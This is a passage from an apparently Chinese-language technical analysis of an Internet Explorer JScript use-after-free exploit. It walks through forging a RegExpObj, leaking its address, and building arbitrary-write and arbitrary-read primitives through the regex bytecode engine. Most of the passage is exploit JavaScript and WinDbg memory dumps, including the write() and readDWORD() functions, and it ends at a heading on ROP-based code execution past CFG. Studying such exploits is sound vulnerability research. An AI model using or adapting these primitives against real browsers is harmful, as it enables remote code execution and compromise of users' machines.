
```javascript
var bstrVal = 8;
var sizeof_RegExpObj = 0xC0;
var m_pvarMaster = 0x10;
var m_varCode = 0x38;
var m_varSrc = 0x48;
// ... code skipped ...
// here nrefs[leakIndex].length value is faulty and points to a large number
// nrefs[leakIndex].charCodeAt(i) can be used to read arbitrary bytes.
var fakeRegExpCharCodes = new Array();
fakeRegExpCharCodes.push((nrefs[leakIndex].length * 2) & 0xFFFF);
fakeRegExpCharCodes.push(((nrefs[leakIndex].length * 2) >> 16) & 0xFFFF);
for(var i = 0; i < sizeof_RegExpObj / sizeof_WCHAR; i++)
fakeRegExpCharCodes.push(nrefs[leakIndex].charCodeAt(i));
fakeRegExpCharCodes[m_pvarMaster / sizeof_WCHAR] = 0;
fakeRegExpCharCodes[(m_pvarMaster / sizeof_WCHAR) + 1] = 0;
for(var i = 0; i < sizeof_VAR / sizeof_WCHAR; i++){
fakeRegExpCharCodes[m_varCode / sizeof_WCHAR + i] = fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i];
fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i] = 0;
}
for(var i = 0; i < shellcode.length; i++)
fakeRegExpCharCodes.push(0xCCCC);
var fakeRegExpStr = String.fromCharCode.apply(null, fakeRegExpCharCodes);
```

### 从越界读取到任意地址写

前面已经从内存中“dump”出一个完整的`RegExpObj`（一共`dump`了`sizeof_RegExpObj+4`字节），接下来是整个利用过程的精彩部分，跟随笔者一起来看一下利用代码如何借助正则表达式对象构造一个完美的任意地址写入原语。

要理解这一过程，首先需要了解下`RegExpObj`的一些成员，`RegExpObj`在32位下的大小为`0xC0`，其中比较重要的几个成员如下：

- `RegExpObj+0x10`: 这里保存着一个地址，该地址指向一个`type=0x81`的`variant`，此`variant`指向当前`RegExpObj`

- `RegExpObj+0x38`：这里保存着一个`type=0x80`（间接引用）的`variant`，该`variant.obj_ptr`进一步指向一个`type=0x08`（字符串）的`variant`，该`variant.obj_ptr`指向一个`RegExpExec`对象首部，`RegExpExec`对象首部是一个`0x4b74614e`魔术值，接着是一个头部，然后是一个与正则`pattern`相对应的字符串

- `RegExpObj+0x48`: 这里保存着一个`type=0x08`（字符串）的`variant`，该`variant.obj_ptr`指向一个`BSTR`对象，此`BSTR`对象保存着与正则文本域相对应的字符串。但需要注意的是，这个地方的的`variant`只有在调用`RegExp.source()`后才会得到初始化

如上面代码所示，利用借助`fakeRegExpCharCodes`数组修改了上述`RegExpObj+0x10`和`RegExpObj+0x38`处的变量，首先将`RegExpObj+0x10`开始的4字节置为空，然后将`RegExpObj+0x48`处的`0x10`字节拷贝到`RegExpObj+0x38`处，即替换了对应的`variant`。为什么要这么做？这就涉及到本小节最前面的那句`new RegExp(reSrc)`。原来，攻击者传给`RegExp`的`reSrc`参数是一个精心设计的`RegExpExec`，经过上面的替换后`RegExpObj+0x38`处的`RegExpExec`已经变成一个伪造的`RegExpExec`，后面正是借助这个伪造的`RegExpExec`实现任意地址写。

修改完`fakeRegExpCharCodes`后，将其转化为一个`fakeRegExpStr`字符串对象，然后循环调用`RegExp.compile`方法将其更新到内存，并调用`RegExp.source`将`fakeRegExpStr`的地址更新到`RegExpObj+0x48`处的`variant.obj_ptr`，随后读取`RegExpObj+0x48`处的内存，得到`fakeRegExpStr`的地址。

得到`fakeRegExpStr`的地址后，再次借助`makeVariant`将其封装为一个`type=0x81`的`variant`，并第3次触发漏洞将`variant`布局到被释放的内存。随后在内存定位到对应的`variant`，得到一个`RegExpObj`，取出`RegExpObj+0x48`处的`variant`。如前所述，这个`variant`是`type=0x80`，是一个间接引用，需要读取`variant.obj_ptr`作为新的`variant`，再读取一次`variant.obj_ptr`

```javascript
// obj_ptr points to the VAR.obj_ptr corresponding to the VAR in RegExpObj+0x48
var obj_ptr = (nrefs[leakIndex].charCodeAt(((m_varSrc - 4 + bstrVal) / sizeof_WCHAR) + 1) << 16) | (nrefs[leakIndex].charCodeAt((m_varSrc - 4 + bstrVal) / sizeof_WCHAR) + 2); // 注意这边这个+2很有意思
// The memory at obj_ptr is read, by creating fake VARs pointing to the addres in obj_ptr (VAR.obj_ptr)
var extendPropertyName2 = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0082, obj_ptr);
for(var i = refsLimit; i >= leakIndex; i--)
nrefs[i] = null;
for(var i = 0; i < 0x1000; i++)
propHolders[i][extendPropertyName2] = 1;
while(--leakIndex >= 0)
try{
if((typeof nrefs[leakIndex]) === "string" && nrefs[leakIndex].length > 0x1000) // m_varSrc处是一个type=0x80的variant指针，解引用后是一个type=8的字符串VAR
break;
else
nrefs[leakIndex] = null;
}catch(e){}
if(leakIndex == -1)
throw new Error("Could not find GcBlock leak string.");
else{}
var fakeRegExpAddr = -1;
/*
Reading the content of this VAR.Obj_ptr, this VAR corresponding to a String VAR.
0:000> dc 076cf6f8-10
076cf6e8 076c0008 054ebd08 061ebcec 6c011380 ..l...N........l
076cf6f8 00000008 00000000 [061ebb24] 076cf728 ........$...(.l. <- 内存对齐时的variant
076cf708 00000008 00000000 061e8114 076cf6a8 ..............l.
076cf718 00000008 00000000 061eb95c 40300000 ........\.....0@
076cf728 02bb0081 00000002 0770c9f0 076cf748 ..........p.H.l.
076cf738 00000009 00000000 0770a158 00000000 ........X.p.....
076cf748 076c0008 054ebd08 061eb794 6c011380 ..l...N........l
076cf758 00000008 00000000 061eb5cc 076cf788 ..............l.
0:000> dc 076cf6f8+2-4
076cf6f6 00086c01 00000000 [bb24]0000 f728[061e] .l........$...(. <- 借助前面的数据伪造length后的内存，所以为 charCodeAt(4) << 16) | charCodeAt(3)，长度被解释为，0x86c01，符合校验条件
076cf706 0008076c 00000000 81140000 f6a8061e l...............
076cf716 0008076c 00000000 b95c0000 0000061e l.........\.....
076cf726 00814030 000202bb c9f00000 f7480770 0@..........p.H.
076cf736 0009076c 00000000 a1580000 00000770 l.........X.p...
076cf746 00080000 bd08076c b794054e 1380061e ....l...N.......
076cf756 00086c01 00000000 b5cc0000 f788061e .l..............
076cf766 0008076c 00000000 7d6c0000 f708061e l.........l}....
// fake RegExpObj
0:000> dc 061ebb24
061ebb24 6bfe2b3c 00000001 078b7af0 02bc3588 <+.k.....z...5..
061ebb34 00000000 ffffffff 076caf40 00080000 ........@.l.....
061ebb44 00000000 6bfe78a8 02bbe920 0770c93c .....x.k ...<.p.
061ebb54 0770caf4 6c071bb8 00000080 00000000 ..p....l........
061ebb64 076cc338 00000000 00000000 00000000 8.l.............
061ebb74 00000000 00000000 00000000 00000000 ................
061ebb84 00000000 00000000 00000000 00000000 ................
061ebb94 00000000 00000000 00000000 00000000 ................
0:000> ln 6bfe2b3c
(6bfe2b3c) jscript!RegExpObj::`vftable' | (6bfe2c38) jscript!NameList::`vftable'
Exact matches:
*/
if(nrefs[leakIndex].charCodeAt)
fakeRegExpAddr = (nrefs[leakIndex].charCodeAt(4) << 16) | nrefs[leakIndex].charCodeAt(3); // 读取fakeRegExp字符串首地址
if(fakeRegExpAddr == -1)
throw new Error("Failed to leak fake RegExp address.");
```

获得`fakeRegExpAddr`后，再次借助`makeVariant`，将`fakeRegExpAddr`封装到一个`type=0x81`的`variant`，随后第4次借助漏洞进行布局，在内存中搜索得到伪造的`RegExp`对象，到这里就获得了一个精心伪造的`RegExp`对象，借助`RegExp.test()`函数测试是否伪造正确：

```javascript
var extendPropertyName3 = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0081, fakeRegExpAddr); // regexp type
for(var i = refsLimit; i >= leakIndex; i--)
nrefs[i] = null;
for(var i = 0; i < 0x1000; i++)
propHolders[i][extendPropertyName3] = 1;
while(--leakIndex >= 0)
try{
if((typeof nrefs[leakIndex]) === "object")
break;
else
nrefs[leakIndex] = null;
}catch(e){}
if(leakIndex == -1)
throw new Error("Could not find fake RegExp.");
else{}
var fakeRegExp = nrefs[leakIndex];
var reTestResult = fakeRegExp.test("t"); // RegExp.test()
if(!reTestResult)
throw new Error("Fake RegExp did not respond correctly to test execution, creation may have failed.");
```

借助上述伪造的`RegExp`对象就可以实现任意地址写：

```javascript
function write(where, what) {
try {
var byteCodeStack = String.fromCharCode.apply(null, [0x0077, 0x0110, 0x0000, 0x0000, 0x0000, ((what & 0xFF) << 8) | 0x03, (what & 0xFFFF00) >> 8, ((where & 0xFF) << 8) | (((what & 0xFF000000) >> 24) & 0xFF), (where & 0xFFFF00) >> 8, (0x07 << 8) | (((where & 0xFF000000) >> 24) & 0xFF)]);
fakeRegExp.test(byteCodeStack);
} catch(e) {}
return byteCodeStack;
}
```

这个`write`函数是整个利用中最精彩的部分，这个原语的构造细节涉及到`Jscript`正则引擎的虚拟机知识，利用的编写者肯定对`Jscript`模块的正则表达引擎非常熟悉。由于笔者并不擅长这块，这部分等待有能力的读者进行补充分析。

### 从任意地址写到任意地址读

有了任意地址写原语后，配合`RegExpObj+0x48`处的`variant`，就可以通过修改`type`和`obj_ptr`的方式实现任意地址读取，由于`BSTR`对象的`length`在读取时会除以2，所以具体的读取函数会借助移位来避免数据失真。

```javascript
function readBYTE(where){
write(fakeRegExpAddr + m_varSrc, 0x82);
write(fakeRegExpAddr + m_varSrc + bstrVal, where + sizeof_DWORD - 1);
return (fakeRegExp.source.length >> 7) & 0xFF;
}
function readWORD(where){
return ((readBYTE(where + 1) << 8) | readBYTE(where));
}
function readDWORD(where){
return ((readBYTE(where + 3) << 24) | (readBYTE(where + 2) << 16) | (readBYTE(where + 1) << 8) | readBYTE(where));
}
```

### 代码执行

构造出任意地址读写原语后，利用代码首先借助这两个原语封装了一系列功能函数，然后借助`write`函数的返回值泄露了一个`native`栈上的地址，并在该基础上得到一个栈上的返回地址，用搜索得到的`ROP` `gadget`覆盖之，在函数返回时，控制流被劫持，绕过`CFG`并运行`shellcode`：
